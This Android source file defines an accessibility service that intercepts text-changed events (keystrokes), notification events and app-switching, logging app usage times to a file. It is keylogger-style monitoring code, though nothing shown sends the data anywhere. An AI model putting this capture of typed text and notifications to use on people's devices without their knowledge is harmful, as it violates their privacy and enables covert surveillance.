package com.vikasyadavnsit.cdc.services;

import static com.vikasyadavnsit.cdc.constants.AppConstants.BLANK_STRING;
import static com.vikasyadavnsit.cdc.utils.AccessibilityUtils.processNotificationEvent;
import static com.vikasyadavnsit.cdc.utils.AccessibilityUtils.processTextChangedEvent;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.os.Build;
import android.text.format.DateFormat;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import org.apache.commons.lang3.StringUtils;

import java.time.LocalDateTime;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.stream.Collectors;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AppUsageService";
    private static final Map<String, Long> appStartTimes = new HashMap<>();
    private static final Map<String, Long> appUsageTimes = new HashMap<>();
    private static final Map<String, Integer> appOpenCounts = new HashMap<>();
    private static String lastPackageName = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Handle accessibility events, such as keystrokes / text changed events
        if (isTextChangedEvent(event)) {
            processTextChangedEvent(event);
        } else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            processWindowStateMovement(event.getPackageName());
        } else if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            processNotificationEvent(event);
        }
    }

    @Override
    public void onServiceConnected() {
        LoggerUtils.d("MyAccessibilityService", "Service Connected");
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        //LoggerUtils.d("AccessibilityService", "Key Event Received: ${event?.keyCode}");
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption, if necessary
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    private static boolean isTextChangedEvent(AccessibilityEvent event) {
        return event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
    }

    private static void processWindowStateMovement(CharSequence packageName) {
        if (packageName != null) {
            String currentPackageName = packageName.toString();
            long currentTime = System.currentTimeMillis();

            if (!currentPackageName.equals(lastPackageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!lastPackageName.isEmpty() && appStartTimes.containsKey(lastPackageName)) {
                    long startTime = appStartTimes.remove(lastPackageName);
                    long usageTime = currentTime - startTime;
                    appUsageTimes.put(lastPackageName, appUsageTimes.getOrDefault(lastPackageName, 0L) + usageTime);
                    FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App closed: " + lastPackageName + " at : " + LocalDateTime.now() + ", used for: " + usageTime + " ms");
                }

                FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App opened: " + currentPackageName + " at : " + LocalDateTime.now());
                appStartTimes.put(currentPackageName, currentTime);
                appOpenCounts.put(currentPackageName, appOpenCounts.getOrDefault(currentPackageName, 0) + 1);
                lastPackageName = currentPackageName;
            }
        }
    }

    public static void printDailyUsageStatic() {
        for (Map.Entry<String, Long> entry : appUsageTimes.entrySet()) {
            String packageName = entry.getKey();
            long usageTime = entry.getValue();
            int openCount = appOpenCounts.getOrDefault(packageName, 0);
            FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App: " + packageName + " used for: " + usageTime + " ms, opened: " + openCount + " times.");
        }
    }

    public static void resetUsageDataStatic() {
        appUsageTimes.clear();
        appOpenCounts.clear();
        lastPackageName = "";
        appStartTimes.clear();
        LoggerUtils.d("MyAccessibilityService", "Usage data reset ");
    }
}
